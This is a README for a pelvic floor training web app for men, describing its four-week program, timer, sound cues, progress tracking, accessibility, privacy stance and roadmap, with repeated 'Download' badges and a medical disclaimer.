![preview](https://raw.githubusercontent.com/IT26100200/core-coach-pwa/main/card_908fb0c.svg)
[![Download](https://raw.githubusercontent.com/IT26100200/core-coach-pwa/main/grab_0d4e949.svg)](https://IT26100200.github.io/core-coach-pwa/)

# PelvicForge — The 4-Week Pelvic Floor Athlete Program 🏋️‍♂️

**A progressive web app that transforms pelvic floor training from a forgotten chore into a measurable, motivating daily ritual for men.**

[![Download](https://raw.githubusercontent.com/IT26100200/core-coach-pwa/main/grab_0d4e949.svg)](https://IT26100200.github.io/core-coach-pwa/)

---

## 🧭 Table of Contents

- [What Is PelvicForge?](#-what-is-pelvicforge)
- [Why Pelvic Floor Training Matters for Men](#-why-pelvic-floor-training-matters-for-men)
- [The 4-Week Program Architecture](#-the-4-week-program-architecture)
- [Feature Highlights](#-feature-highlights)
- [Real-Time Timer Engine](#-real-time-timer-engine)
- [Sound Cue System](#-sound-cue-system)
- [Feedback & Progress Tracking](#-feedback--progress-tracking)
- [Responsive UI Across Every Screen](#-responsive-ui-across-every-screen)
- [Multilingual Support](#-multilingual-support)
- [Accessibility & Inclusivity](#-accessibility--inclusivity)
- [Round-the-Clock Support Desk](#-round-the-clock-support-desk)
- [Tech Stack Overview](#-tech-stack-overview)
- [Progressive Web App Capabilities](#-progressive-web-app-capabilities)
- [Privacy & Data Philosophy](#-privacy--data-philosophy)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing Guidelines](#-contributing-guidelines)
- [Code of Conduct](#-code-of-conduct)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🧭 What Is PelvicForge?

PelvicForge is a browser-first training companion built for men who want to rebuild control, endurance, and confidence in their pelvic floor muscles — without needing a gym membership, a wearable gadget, or a complicated medical device. Think of it as a personal coach that lives quietly in your pocket, whispering perfectly timed cues while you go about your day.

Unlike generic reminders that ping you at random moments, PelvicForge follows a structured four-week curriculum inspired by physiotherapy rehabilitation principles. Each session is timed, guided, and scored, so progress is visible instead of guessed at.

The application installs directly to your home screen as a Progressive Web App, meaning it behaves like a native mobile experience while remaining lightweight and universally compatible with modern browsers.

[![Download](https://raw.githubusercontent.com/IT26100200/core-coach-pwa/main/grab_0d4e949.svg)](https://IT26100200.github.io/core-coach-pwa/)

---

## 💪 Why Pelvic Floor Training Matters for Men

The pelvic floor is a hammock of muscles that supports organs, influences bladder control, contributes to sexual health, and even plays a role in posture and core stability. Yet for decades, the conversation around pelvic health has been dominated by women's wellness, leaving many men unaware that these muscles deserve just as much attention.

Common life events — long hours sitting at a desk, cycling, surgery recovery, aging, or simply chronic stress — can weaken this muscular hammock. PelvicForge exists to make the rebuilding process approachable, structured, and even enjoyable.

The goal isn't perfection on day one. It's consistency. Small, deliberate contractions, repeated daily, accumulate into meaningful change over a month.

---

## 📅 The 4-Week Program Architecture

PelvicForge organizes training into four distinct phases, each with a different emphasis so the muscles adapt progressively rather than plateau.

**Week 1 — Awakening**
Gentle identification exercises help you locate the correct muscles and distinguish them from your abs, glutes, and thighs. Hold times are short; the focus is precision.

**Week 2 — Endurance**
Hold durations stretch slightly longer, and rest intervals shrink. Quick-flick contractions are introduced to train both slow-twitch and fast-twitch fibers.

**Week 3 — Power**
Intensity ramps up with layered contractions — a moderate hold, a strong squeeze, then a controlled release. Coordination between breathing and contraction becomes central.

**Week 4 — Integration**
Sessions simulate real-world scenarios: sneezing, lifting, standing up quickly. The aim is automatic recruitment, so the muscles respond without conscious effort.

Each week contains seven daily sessions, though the app gracefully allows skip days and reshuffles the calendar so you never feel punished for missing one.

---

## ✨ Feature Highlights

- Guided four-week curriculum with adaptive pacing
- Real-time contraction timer with visual and audio feedback
- Configurable rest and hold intervals
- Session scoring that rewards consistency, not intensity
- Gentle haptic-style vibration cues on supported devices
- Offline-first design — train on a plane, train on a train
- Installable as a Progressive Web App on Android, iOS, and desktop
- Dark mode and high-contrast themes
- Streak tracking with weekly recap summaries
- Multilingual interface with locale-aware formatting
- Round-the-clock support desk for troubleshooting

---

## ⏱ Real-Time Timer Engine

At the heart of PelvicForge lies a timing engine that refuses to drift. Whether you're holding a contraction for five seconds or resting for ten, the countdown stays accurate even when the browser tab loses focus or the phone screen dims.

The timer uses a monotonic clock source under the hood, so background throttling from aggressive battery savers won't throw off your intervals. A circular progress ring animates in sync, giving you peripheral awareness of where you are in the cycle without staring at numbers.

Users can customize:
- Hold duration per phase
- Rest duration between repetitions
- Number of repetitions per set
- Number of sets per session
- Optional warm-up and cool-down windows

Presets ship for beginners, intermediate, and advanced levels, but every value is adjustable.

---

## 🔊 Sound Cue System

Audio cues are the invisible coach. A soft ascending tone signals the start of a contraction. A gentle descending chime marks the release. A neutral tick separates repetitions. All cues are synthesized in the browser, meaning no external audio files are downloaded, and the app works offline.

Users may choose from several cue palettes:
- **Calm** — soft sine tones for quiet environments
- **Focus** — crisp clicks for distraction-free focus
- **Silent** — visual-only mode for public spaces

Volume is independently controlled from system volume where the browser permits, and a mute toggle is always one tap away.

---

## 📈 Feedback & Progress Tracking

Every completed session is logged locally. Over time, users see:
- Daily streaks
- Weekly completion rates
- Average hold duration trends
- Consistency heatmaps

The philosophy here is encouragement over judgment. Missing a day doesn't reset a streak to zero; it simply pauses it, and the app suggests a gentle re-entry session rather than a punishing restart.

Progress data stays on the device by default. Optional export to a JSON file lets users back up their history manually.

---

## 📱 Responsive UI Across Every Screen

PelvicForge was designed mobile-first, but it refuses to look awkward on a 27-inch monitor. Layouts reflow fluidly using modern CSS grid and container queries. Touch targets meet accessibility sizing guidelines, and the largest control — the primary action button — always sits within thumb reach on phones.

On tablets, the timer ring expands and session history moves to a side panel. On desktop, keyboard shortcuts become available for hands-free operation.

---

## 🌐 Multilingual Support

The interface ships with translations covering major world languages, with right-to-left layout support for Arabic and Hebrew. Locale detection happens automatically, but a manual language switcher is always present in settings.

Every translated string lives in a structured resource file, making community contributions straightforward. Pluralization rules follow the Unicode CLDR standard, so languages with complex plural forms are handled correctly.

Languages currently supported include English, Spanish, French, German, Portuguese, Hindi, Japanese, Korean, Arabic, and Hebrew — with more arriving as contributors volunteer.

---

## ♿ Accessibility & Inclusivity

- Full keyboard navigation across every screen
- Screen reader announcements for timer state changes
- WCAG AA color contrast in all default themes
- Reduced-motion mode that disables animations
- Adjustable text scaling up to 200 percent

Training pelvic muscles is personal. The interface respects that by never assuming a user's body, history, or comfort level.

---

## 🛎 Round-the-Clock Support Desk

Questions don't wait for business hours, and neither does the support desk. A rotating team of maintainers and community volunteers monitors the issue tracker and discussion forum around the clock. Whether it's a bug report at 3 AM or a feature suggestion during a lunch break, someone will respond.

Support channels include:
- GitHub Discussions for open conversation
- Issue tracker for reproducible bugs
- Community chat for informal help
- Documentation wiki for self-service answers

Response targets aim for under twenty-four hours for first contact, and critical regressions are triaged immediately.

---

## 🧱 Tech Stack Overview

- **Framework:** Component-driven frontend with reactive state
- **Styling:** Utility-first CSS with custom design tokens
- **Audio:** Web Audio API for synthesized cues
- **Storage:** IndexedDB with a lightweight wrapper for history
- **Build:** Modern bundler with tree-shaking and code splitting
- **Testing:** Unit, integration, and end-to-end suites
- **CI/CD:** Automated checks on every pull request

The stack favors longevity over novelty. Dependencies are audited regularly, and the project avoids frameworks that require frequent rewrites.

---

## 📲 Progressive Web App Capabilities

PelvicForge installs like a native app without the app store middleman. Service workers cache the core shell, allowing offline training. The manifest defines icons, theme colors, and display modes for a polished home-screen appearance.

Push notifications are optional and used sparingly — a single daily nudge at a time the user chooses, never more.

Updates deploy silently in the background and apply on next launch, so users always run the latest version without friction.

---

## 🔐 Privacy & Data Philosophy

No account is required. No email is collected. No analytics profile follows you across the web. Session data lives in your browser's local storage, and you can wipe it at any time with a single button.

If future cloud sync arrives, it will be strictly opt-in with end-to-end encryption and transparent documentation of what leaves the device.

The project believes health data belongs to the person who generated it.

---

## 🔎 SEO & Discoverability Notes

The documentation deliberately uses natural language around terms like *pelvic floor training for men*, *Kegel exercise timer*, *four-week pelvic program*, and *progressive web app for men's health*. These phrases appear organically in headings and prose rather than being stuffed into hidden metadata.

Structured data markup helps search engines understand the app's purpose, and semantic HTML ensures screen readers and crawlers alike can parse content cleanly.

---

## 🗺 Roadmap for 2026

- Wearable integration for heart-rate-aware pacing
- Voice-guided coaching with adjustable personas
- Adaptive difficulty using machine learning on local data
- Expanded language coverage including Swahili and Vietnamese
- Optional clinician dashboard for physiotherapists
- Offline-first sync conflict resolution
- Community challenge events with opt-in leaderboards

The roadmap is public and open to discussion. Priorities shift based on real user feedback.

---

## 🤝 Contributing Guidelines

Contributions of every size are welcome — from typo fixes to new translations to core feature work. Before opening a pull request:
- Read the contributing guide in the docs folder
- Run the test suite locally
- Follow the established commit message convention
- Keep pull requests focused on a single concern

First-time contributors are encouraged to browse issues tagged as beginner-friendly.

---

## 📜 Code of Conduct

This project adheres to a contributor covenant that prioritizes respect, inclusivity, and constructive dialogue. Harassment of any kind is not tolerated. Reports are handled confidentially by maintainers.

---

## 📄 License

This project is distributed under the MIT License. See the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 PelvicForge Contributors

---

## ⚠️ Disclaimer

PelvicForge is an educational and motivational tool, not a medical device. It does not diagnose, treat, cure, or prevent any condition. Individuals with pelvic pain, recent surgery, or underlying medical concerns should consult a qualified healthcare professional before beginning any exercise regimen.

The maintainers assume no liability for injury or discomfort arising from use of this application. Listen to your body, and stop if something feels wrong.

Training should feel like a gentle conversation with your muscles — never a shouting match.

[![Download](https://raw.githubusercontent.com/IT26100200/core-coach-pwa/main/grab_0d4e949.svg)](https://IT26100200.github.io/core-coach-pwa/)

---

**PelvicForge** — because strength begins where most people never think to look.